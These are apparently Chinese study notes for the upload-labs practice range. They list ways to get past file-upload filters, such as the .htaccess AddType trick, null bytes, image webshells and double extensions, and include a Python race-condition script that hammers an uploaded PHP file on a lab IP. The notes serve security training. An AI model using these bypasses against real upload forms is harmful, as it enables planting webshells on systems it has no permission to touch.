# 1.前端js绕过




# 2.绕过MIME-Type验证
content-type




# 3.等价扩展名绕过验证
httpd.conf-》写入add php3....




# 4.    .htaccess文件绕过
.htaccess文件
`AddType application/x-httpd-php .txt .jpg`





# 5.    .user.ini绕过
大于5.3最好大于7.0




# 6. 大小写绕过




# 7.通过空格绕过




# 8.通过.绕过（windows）





# 9.通过特殊字符绕过验证
windows NT系统



# 10.通过拼接路径绕过






# 11.通过双写绕过验证





# 12.空字符绕过(get)
php版本5.2
php.ini -》 magic_quotes_gpc = Off



# 13.空字符绕过(post) 




# 14.文件头绕过
010editor
文件包含漏洞



# 15.图片马绕过
php版本>5.4





16题跳过 开exif模块剩下的和15一样
# 16. 图片的二次渲染绕过




# 17.条件竞争

```python
import requests
import threading
import os

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.url = 'http://192.168.60.143/upload-labs/upload/1.php'

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print(r.text)
            os._exit(0)

    def run(self):
        while True:
            for i in range(5):
                self._get()
            for i in range(10):
                self._get()

if __name__ == '__main__':
    threads = 50
    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()
```





# 18.代码审计绕过（21题）